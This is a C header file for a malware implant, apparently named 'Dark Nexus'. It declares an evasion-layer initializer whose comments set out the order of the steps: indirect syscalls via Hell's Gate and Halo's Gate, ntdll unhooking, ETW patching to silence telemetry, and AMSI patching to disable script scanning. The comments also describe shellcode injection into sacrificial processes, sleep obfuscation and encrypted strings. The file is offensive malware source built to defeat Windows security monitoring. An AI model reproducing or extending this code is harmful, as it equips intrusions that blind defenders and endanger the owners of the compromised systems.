#ifndef DN_EVASION_H
#define DN_EVASION_H

#include <windows.h>

/*
 * Dark Nexus - Evasion Layer Integration
 *
 * Single entry point to initialize the full evasion stack.
 * Call dn_evasion_init() before any operational activity.
 *
 * Initialization order:
 *   1. Syscall engine (Hell's Gate + Halo's Gate SSN extraction)
 *   2. ntdll unhooking (restore clean .text section)
 *   3. ETW patching (silence telemetry)
 *   4. AMSI patching (disable script scanning)
 *
 * After init, the implant can use:
 *   - DnNt* indirect syscall wrappers for all Nt API calls
 *   - dn_resolve() for dynamic API resolution by hash
 *   - dn_inject() for shellcode injection into sacrificial processes
 */

#include "syscalls.h"
#include "unhook.h"
#include "api_resolve.h"
#include "etw_patch.h"
#include "injection.h"
#include "sleep_obfusc.h"
#include "strings_encrypt.h"

// Evasion initialization status
typedef struct {
    BOOL syscalls_ready;        // SSN table populated
    BOOL ntdll_unhooked;        // clean .text restored
    BOOL etw_patched;           // EtwEventWrite neutralized
    BOOL amsi_patched;          // AmsiScanBuffer neutralized
    BOOL sleep_ready;           // sleep obfuscation initialized
    int  total_patches;         // number of successful patches
} DN_EVASION_STATUS;

// Initialize the full evasion stack
// Returns status struct indicating what succeeded
DN_EVASION_STATUS dn_evasion_init(void);

#endif // DN_EVASION_H
